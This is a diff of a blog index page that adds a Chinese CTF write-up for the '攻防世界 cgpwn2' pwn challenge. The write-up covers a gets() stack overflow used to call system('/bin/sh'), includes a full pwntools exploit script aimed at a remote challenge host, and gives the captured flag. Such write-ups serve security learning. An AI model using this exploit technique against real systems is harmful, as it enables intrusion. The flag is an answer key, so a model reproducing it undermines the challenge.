@@ -197,7 +197,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/mood/" style="font-size: 10px;">mood</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a>
+                        <a href="/tags/mood/" style="font-size: 10px;">mood</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a>
                     </div>
                 </section>
                 
@@ -278,6 +278,75 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-攻防世界pwn-cgpwn2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/" class="article-date">
+      <time datetime="2020-05-08T01:29:18.775Z" itemprop="datePublished">2020-05-08</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/">攻防世界 cgpwn2</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>算是简单题，进入hello()函数中发现gets(&amp;s) 栈溢出漏洞。</p>
+<p>name是全局变量，在bss区段，适合写入。</p>
+<p>pwn()函数中调用了__system，但并没有‘/bin/sh’</p>
+<p><img src="https://i.loli.net/2020/05/08/veR8Fb2xkDMifVz.png" alt="17627983-d0f4027f425eadcd.png"></p>
+<p><img src="https://i.loli.net/2020/05/08/QPL4xp8Wws1DJUc.png" alt="17627983-8f37fec1f7e9fab3.png"></p>
+<p><img src="https://i.loli.net/2020/05/08/abOyYLf9FERVqvZ.png" alt="17627983-a19abf21a8c9c0f7.png"></p>
+<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>在name中写入’/bin/sh’。利用栈溢出覆盖返回地址，使函数返回到system上，拿到shell。</p>
+<p>payload=填充栈+覆盖保存的exp的值4字节+假的返回地址call __system(‘/bin/sh’)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> # p &#x3D; process(&#39;.&#x2F;cgpwn2&#39;)</span><br><span class="line">p &#x3D; remote(&quot;111.198.29.45&quot;,32966)</span><br><span class="line">system_addr &#x3D; 0x804855A</span><br><span class="line">bss_addr &#x3D; 0x804A080</span><br><span class="line">p.recvuntil(&#39;name\n&#39;)</span><br><span class="line">p.sendline(&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line">p.recvuntil(&#39;here:\n&#39;)</span><br><span class="line">payload &#x3D; 0x26*&#39;a&#39; +&#39;bbbb&#39;+ p32(system_addr) + p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>cyberpeace{f92dbe7e38fed8edda8b7513b09acdc7}</p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-Loving strangers" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -355,7 +424,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-level3/">攻防世界-pwn-level3</a>
+      <a class="article-title" href="/2020/05/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-level3/">攻防世界 level3</a>
     </h1>
   
 
